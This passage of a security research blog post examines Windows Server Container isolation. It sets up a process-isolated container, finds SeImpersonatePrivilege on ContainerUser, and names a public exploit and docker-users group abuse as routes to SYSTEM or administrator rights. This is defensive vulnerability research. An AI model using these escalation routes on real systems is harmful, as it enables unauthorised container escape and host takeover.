 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;Fast forward another few months and a Googler reached out to ask me some questions about Windows Server Containers. Another researcher at Palo Alto Networks had reported to Google Cloud that &lt;/span&gt;&lt;span&gt;Google Kubernetes Engine (GKE)&lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;&amp;nbsp;was vulnerable to the issue Daniel had identified. Google Cloud was using Windows Server Containers to run Kubernetes, so it was possible to escape the container and access the host, which was not supposed to be accessible. &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;Microsoft had not patched the issue and it was still exploitable. They hadn&amp;rsquo;t patched it because Microsoft does not consider these issues to be serviceable. Therefore the GKE team was looking for mitigations. One proposed mitigation was to enforce the containers to run under the &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;ContainerUser &lt;/span&gt;&lt;span&gt;account instead of the &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;ContainerAdministrator&lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;. As the reported issue only works when running as an administrator that would seem to be sufficient. &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;However, I wasn&amp;rsquo;t convinced there weren&amp;#39;t similar vulnerabilities which could be exploited from a non-administrator user. Therefore I decided to do my own research into Windows Server Containers to determine if the guidance of using &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;ContainerUser &lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;would really eliminate the risks.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c11&quot;&gt;While I wasn&amp;rsquo;t expecting MS to fix anything I found it would at least allow me to provide internal feedback to the GKE team so they might be able to better mitigate the issues. It also establishes a rough baseline of the risks involved in using Windows Server Containers. It&amp;rsquo;s known to be problematic, but how problematic?&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;c12&quot; id=&quot;h.7ymdzmqeqrfv&quot;&gt;&lt;span class=&quot;c22 c34&quot;&gt;Research Process&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c11&quot;&gt;The first step was to get some code running in a representative container. Nothing that had been reported was specific to GKE, so I made the assumption I could just run a local Windows Server Container. &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;Setting up your own server silo from scratch is undocumented and almost certainly unnecessary. When you enable the Container support feature in Windows, the Hyper-V Host Compute Service is installed. This takes care of setting up both Hyper-V and process isolated containers. The API to interact with this service isn&amp;rsquo;t officially documented, however Microsoft has provided public wrappers (with scant documentation), for example this is the &lt;/span&gt;&lt;span class=&quot;c23&quot;&gt;&lt;a class=&quot;c311&quot; href=&quot;https://github.com/microsoft/hcsshim&quot;&gt;Go wrapper&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;Realistically it&amp;rsquo;s best to just use &lt;/span&gt;&lt;span class=&quot;c23&quot;&gt;&lt;a class=&quot;c311&quot; href=&quot;https://www.docker.com/products/docker-desktop&quot;&gt;Docker&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;&amp;nbsp;which takes the MS provided Go wrapper and implements the more familiar Docker CLI. While there&amp;rsquo;s likely to be Docker-specific escapes, the core functionality of a Windows Docker container is all provided by Microsoft so would be in scope. Note, there are two versions of Docker: Enterprise which is only for server systems and Desktop. I primarily used Desktop for convenience.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c2&quot;&gt;As an aside, MSRC does not count any issue as crossing a security boundary where being a member of the &lt;/span&gt;&lt;span class=&quot;c2 c35&quot;&gt;Hyper-V Administrators&lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;&amp;nbsp;group is a prerequisite. Using the Hyper-V Host Compute Service requires membership of the &lt;/span&gt;&lt;span class=&quot;c2 c35&quot;&gt;Hyper-V Administrators&lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;&amp;nbsp;group. However Docker runs at sufficient privilege to not need the user to be a member of the group. Instead access to Docker is gated by membership of the separate &lt;/span&gt;&lt;span class=&quot;c2 c35&quot;&gt;docker-users&lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;&amp;nbsp;group. If you get code running under a non-administrator user that has membership of the&lt;/span&gt;&lt;span class=&quot;c2 c35&quot;&gt;&amp;nbsp;docker-users&lt;/span&gt;&lt;span class=&quot;c40 c2&quot;&gt;&amp;nbsp;group you can use that to get full administrator privileges by abusing Docker&amp;rsquo;s server silo support.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c11&quot;&gt;Fortunately for me most Windows Docker images come with .NET and PowerShell installed so I could use my existing toolset. I wrote a simple docker file containing the following:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.e07c9d9bc031871a4f6feed90c7439c5a2f2a923&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.0&quot;&gt;&lt;/a&gt;&lt;table class=&quot;c13&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;c9&quot;&gt;&lt;td class=&quot;c24&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;FROM mcr.microsoft.com/windows/servercore:20H2&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;USER ContainerUser&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;COPY NtObjectManager c:/NtObjectManager &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;CMD [ &amp;quot;powershell&amp;quot;, &amp;quot;-noexit&amp;quot;, &amp;quot;-command&amp;quot;, \&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;&amp;nbsp; &amp;quot;Import-Module c:/NtObjectManager/NtObjectManager.psd1&amp;quot; ]&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;This docker file will download a Windows Server Core 20H2 container image from the &lt;/span&gt;&lt;span class=&quot;c23&quot;&gt;&lt;a class=&quot;c311&quot; href=&quot;https://github.com/microsoft/containerregistry&quot;&gt;Microsoft Container Registry&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, copy in my &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;NtObjectManager &lt;/span&gt;&lt;span&gt;PowerShell module and then set up a command to load that module on startup. I also specified that the PowerShell process would run as the user &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;ContainerUser&lt;/span&gt;&lt;span&gt;&amp;nbsp;so that I could test the mitigation assumptions. If you don&amp;rsquo;t specify a user it&amp;rsquo;ll run as &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;ContainerAdministrator &lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;by default.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c2 c40&quot;&gt;Note, when using process isolation mode the container image version must match the host OS. This is because the kernel is shared between the host and the container and any mismatch between the user-mode code and the kernel could result in compatibility issues. Therefore if you&amp;rsquo;re trying to replicate this you might need to change the name for the container image.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c1&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;Create a directory and copy the contents of the docker file to the filename &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;dockerfile&lt;/span&gt;&lt;span&gt;&amp;nbsp;in that directory. Also copy in a copy of my &lt;/span&gt;&lt;span class=&quot;c23&quot;&gt;&lt;a class=&quot;c311&quot; href=&quot;https://www.powershellgallery.com/packages/NtObjectManager/1.1.30&quot;&gt;PowerShell module&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;into the same directory under the &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;NtObjectManager &lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;directory. Then in a command prompt in that directory run the following commands to build and run the container.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.2fd7732a71aa7fde31f1ab43520d1c7ddece71c4&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.1&quot;&gt;&lt;/a&gt;&lt;table class=&quot;c13&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;c9&quot;&gt;&lt;td class=&quot;c24&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c8&quot;&gt;C:\container&amp;gt; &lt;/span&gt;&lt;span class=&quot;c22 c30&quot;&gt;docker build -t test_image .&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Step 1/4 : FROM mcr.microsoft.com/windows/servercore:20H2&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;&amp;nbsp;---&amp;gt; b29adf5cd4f0&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Step 2/4 : USER ContainerUser&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;&amp;nbsp;---&amp;gt; Running in ac03df015872&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Removing intermediate container ac03df015872&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;&amp;nbsp;---&amp;gt; 31b9978b5f34&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Step 3/4 : COPY NtObjectManager c:/NtObjectManager&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;&amp;nbsp;---&amp;gt; fa42b3e6a37f&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Step 4/4 : CMD [ &amp;quot;powershell&amp;quot;, &amp;quot;-noexit&amp;quot;, &amp;quot;-command&amp;quot;, &amp;nbsp; &amp;quot;Import-Module c:/NtObjectManager/NtObjectManager.psd1&amp;quot; ]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;&amp;nbsp;---&amp;gt; Running in 86cad2271d38&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Removing intermediate container 86cad2271d38&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;&amp;nbsp;---&amp;gt; e7d150417261&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Successfully built e7d150417261&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Successfully tagged test_image:latest&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7 c4&quot;&gt;&lt;span class=&quot;c1&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c8&quot;&gt;C:\container&amp;gt; &lt;/span&gt;&lt;span class=&quot;c22 c30&quot;&gt;docker run --isolation=process -it test_image&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;PS&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;I wanted to run code using process isolation rather than in Hyper-V isolation, so I needed to specify the &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;--isolation=process&lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;&amp;nbsp;argument. This would allow me to more easily see system interactions as I could directly debug container processes if needed. For example, you can use Process Monitor to monitor file and registry access. Docker Enterprise uses process isolation by default, whereas Desktop uses Hyper-V isolation. &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;I now&lt;/span&gt;&lt;span&gt;&amp;nbsp;had a PowerShell console running inside the container as &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;ContainerUser&lt;/span&gt;&lt;span&gt;. A quick way to check that it was successful is to try and find the &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;CExecSvc &lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;process, which is the Container Execution Agent service. This service is used to spawn your initial PowerShell console.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.4abdaa6170995b53e099bfa9a436f20f03c1b016&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.2&quot;&gt;&lt;/a&gt;&lt;table class=&quot;c13&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;c9&quot;&gt;&lt;td class=&quot;c24&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c8&quot;&gt;PS&amp;gt; &lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;Get-Process&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c32&quot;&gt;-Name&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c6&quot;&gt;CExecSvc&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7 c4&quot;&gt;&lt;span class=&quot;c1&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Handles &amp;nbsp;NPM(K) &amp;nbsp; &amp;nbsp;PM(K) &amp;nbsp; &amp;nbsp; &amp;nbsp;WS(K) &amp;nbsp; &amp;nbsp; CPU(s) &amp;nbsp; &amp;nbsp; Id &amp;nbsp;SI ProcessName&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;------- &amp;nbsp;------ &amp;nbsp; &amp;nbsp;----- &amp;nbsp; &amp;nbsp; &amp;nbsp;----- &amp;nbsp; &amp;nbsp; ------ &amp;nbsp; &amp;nbsp; -- &amp;nbsp;-- -----------&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c7&quot;&gt;&lt;span class=&quot;c1&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;86 &amp;nbsp; &amp;nbsp; &amp;nbsp; 6 &amp;nbsp; &amp;nbsp; 1044 &amp;nbsp; &amp;nbsp; &amp;nbsp; 5020 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;4560 &amp;nbsp; 6 CExecSvc&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;With a running container it was time to start poking around to see what&amp;rsquo;s available. The first thing I did was dump the &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;ContainerUser&amp;rsquo;s&lt;/span&gt;&lt;span&gt;&amp;nbsp;token just to see what groups and privileges were assigned. You can use the &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;Show-NtTokenEffective&lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;&amp;nbsp;command to do that.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.fa8fbc68d39b0db004d0c7e1d17444209b07a00f&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.3&quot;&gt;&lt;/a&gt;&lt;table class=&quot;c13&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;c9&quot;&gt;&lt;td class=&quot;c24&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c8&quot;&gt;PS&amp;gt; &lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;Show-NtTokenEffective&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c32&quot;&gt;-User&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c32&quot;&gt;-Group&lt;/span&gt;&lt;span class=&quot;c8 c17&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;c8 c17 c32&quot;&gt;-Privilege&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;USER INFORMATION&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;----------------&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Name &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Sid&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;---- &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ---&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;User Manager\ContainerUser S-1-5-93-2-2&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c1&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;GROUP SID INFORMATION&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;-----------------&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Name &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Attributes&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;---- &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ----------&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Mandatory Label\High Mandatory Level &amp;nbsp; Integrity, ...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Everyone &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Mandatory, ...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;BUILTIN\Users &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;Mandatory, ...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;NT AUTHORITY\SERVICE &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Mandatory, ...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;CONSOLE LOGON &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;Mandatory, ...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;NT AUTHORITY\Authenticated Users &amp;nbsp; &amp;nbsp; &amp;nbsp; Mandatory, ...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;NT AUTHORITY\This Organization &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Mandatory, ...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;NT AUTHORITY\LogonSessionId_0_10357759 Mandatory, ...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;LOCAL &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;Mandatory, ...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;User Manager\AllContainers &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Mandatory, ...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c1&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;PRIVILEGE INFORMATION&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;---------------------&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;Name &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;Luid &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;Enabled&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;---- &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;---- &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;-------&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;SeChangeNotifyPrivilege &amp;nbsp; &amp;nbsp; &amp;nbsp; 00000000-00000017 True&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c22 c30&quot;&gt;SeImpersonatePrivilege &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;00000000-0000001D True&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;SeCreateGlobalPrivilege &amp;nbsp; &amp;nbsp; &amp;nbsp; 00000000-0000001E True&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c1&quot;&gt;SeIncreaseWorkingSetPrivilege 00000000-00000021 False&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;The groups didn&amp;rsquo;t seem that interesting, however looking at the privileges we have &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;SeImpersonatePrivilege&lt;/span&gt;&lt;span&gt;. If you have this privilege you can impersonate any other user on the system including administrators. MSRC considers having &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;SeImpersonatePrivilege &lt;/span&gt;&lt;span&gt;as administrator equivalent, meaning if you have it you can assume you can get to administrator. Seems &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;ContainerUser &lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;is not quite as normal as it should be.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;That was a very bad (or good) start to my research. T&lt;/span&gt;&lt;span&gt;he prior assumption was that running as &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;ContainerUser &lt;/span&gt;&lt;span&gt;would not grant administrator privileges, and therefore the global symbolic link issue couldn&amp;rsquo;t be directly exploited. However that turns out to not be the case in practice.&lt;/span&gt;&lt;span&gt;&amp;nbsp;As an example you can use the public &lt;/span&gt;&lt;span class=&quot;c23&quot;&gt;&lt;a class=&quot;c311&quot; href=&quot;https://github.com/antonioCoco/RogueWinRM&quot;&gt;RogueWinRM exploit&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;to get a &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;SYSTEM&lt;/span&gt;&lt;span&gt;&amp;nbsp;token as long as WinRM isn&amp;rsquo;t enabled, which is the case on most Windows container images. There are no doubt other less well known techniques to achieve the same thing. The code which creates the user account is in &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;CExecSvc,&lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;&amp;nbsp;which is code owned by Microsoft and is not specific to Docker.&lt;/span&gt;&lt;/p&gt;
